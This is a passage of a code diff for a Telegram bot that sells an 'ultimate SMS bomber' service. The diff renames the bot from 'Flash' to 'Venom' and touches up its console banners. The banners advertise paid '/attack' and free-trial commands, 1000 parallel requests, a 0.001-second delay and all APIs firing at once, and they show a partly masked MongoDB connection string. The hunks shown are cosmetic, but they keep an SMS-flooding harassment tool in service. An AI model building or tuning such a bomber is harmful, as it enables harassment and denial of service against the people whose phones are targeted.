+║        📢 BROADCAST MESSAGE          ║
+╚═══════════════════════════════════════╝
 
 {message}
 
@@ -3532,9 +3532,9 @@ Only admins can use this command.
     
     await broadcast_msg.edit_text(
         f"""
-╔════════════════════════════════════════╗
-║          ✅ BROADCAST COMPLETE         ║
-╚════════════════════════════════════════╝
+╔═══════════════════════════════════════╗
+║         ✅ BROADCAST COMPLETE         ║
+╚═══════════════════════════════════════╝
 
 📊 Broadcast Results:
 ├─ Total Users: {len(users)}
@@ -3583,22 +3583,22 @@ def main():
     application.add_error_handler(error_handler)
     
     print(f"""
-╔════════════════════════════════════════════════╗
-║        ⚡💥 FLASH BOMBER BOT 💥⚡        ║
-║           ULTIMATE SMS BOMBER           ║
-╚════════════════════════════════════════════════╝
+╔════════════════════════════════════════════╗
+║        ⚡💥 VENOM BOMBER BOT 💥⚡        ║
+║           ULTIMATE SMS BOMBER              ║
+╚════════════════════════════════════════════╝
 
 📡 Bot Information:
 ├─🤖 Bot Token: Loaded
 ├─📊 Total APIs: {TOTAL_APIS}
-├─⚡ Attack Mode: FLASH ATTACK
+├─⚡ Attack Mode: VENOM ATTACK
 ├─💾 Database: MongoDB (Cloud)
 ├─📀 Database URL: mongodb+srv://nikilsaxena843_db_user:****@vipbot.puv6gfk.mongodb.net
 ├─👑 Admin Users: {len(ADMIN_USER_IDS)}
 └─🔥 Status: Starting...
 
-⚡ FLASH ATTACK FEATURES:
-├─ Speed: Level 5 (FLASH MODE)
+⚡ VENOM ATTACK FEATURES:
+├─ Speed: Level 5 (VENOM MODE)
 ├─ Strategy: All APIs fire simultaneously
 ├─ Concurrency: 1000 parallel requests
 ├─ Delay: 0.001 seconds
@@ -3616,8 +3616,8 @@ def main():
 ├─🆘 /help - Help menu
 ├─🎁 /trial - One-time free trial (60s)
 ├─📊 /mytrial - Check trial status
-├─💥 /attack - Paid flash attack
-├─⚡ /speed - Set speed (5=Flash Mode) - PAID ONLY
+├─💥 /attack - Paid VENOM attack
+├─⚡ /speed - Set speed (5=VENOM Mode) - PAID ONLY
 ├─📊 /stats - View statistics
 ├─🛑 /stop - Stop attack
 ├—🔄 /resettrial - Reset user trial (Admin)
@@ -3628,7 +3628,7 @@ def main():
 ├─📋 /users - List users (Admin)
 └─📢 /broadcast - Broadcast (Admin)
 
-🔥 BOT IS NOW RUNNING IN FLASH MODE!
+🔥 BOT IS NOW RUNNING IN VENOM MODE!
 Press Ctrl+C to stop
 """)
     
